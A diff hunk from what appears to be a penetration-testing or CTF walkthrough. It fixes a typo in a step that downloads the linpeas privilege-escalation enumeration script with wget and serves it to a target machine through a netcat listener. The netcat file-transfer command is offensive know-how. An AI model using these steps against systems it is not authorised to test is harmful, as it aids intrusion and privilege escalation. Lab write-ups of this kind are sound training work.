@@ -175,7 +175,7 @@ First lets download it from github. (This following URL also gives good info on 
 ```console
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 ```
-By inputting the following commands we can get it to run (```python -m http.server 80``` is another option since linpeas SimpleHTTPServer was not wokring for me)
+By inputting the following commands we can get it to run (```python -m http.server 80``` is another option since linpeas SimpleHTTPServer was not working for me)
 
 ```console
 sudo nc -lvnp 80 < linpeas.sh #Host
